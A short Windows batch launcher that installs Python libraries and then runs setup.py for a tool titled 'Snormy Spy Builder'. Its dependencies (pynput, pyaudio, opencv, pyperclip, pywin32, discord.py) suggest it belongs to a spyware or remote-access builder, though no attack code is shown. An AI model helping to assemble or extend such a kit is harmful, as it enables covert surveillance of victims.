@echo off
cd /d %~dp0

title Checking Python installation...
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo Python is not installed!
    echo Download it here: https://www.python.org/downloads
    echo Ensure it is added to PATH during installation.
    pause
    exit
)

title Updating Pip...
python -m pip install --upgrade pip --quiet

title Downloading libraries...

for %%A in (
    "requests"
    "pycryptodome"
    "discord.py"
    "opencv-python"
    "pyperclip"
    "pillow"
    "uuid"
    "imageio"
    "pywin32"
    "pynput"
    "pyaudio"
    "wave"
) do (
    echo Checking %%~A...
    python -c "import %%~A" >nul 2>&1
    if %errorlevel% neq 0 (
        echo Installing %%~A...
        python -m pip install %%~A --quiet
    )
)

cls
title Snormy Spy Builder
python setup.py
if %errorlevel% neq 0 goto ERROR
exit

:ERROR
color 4
title [Error]
echo An error occurred while running setup.py.
pause
exit
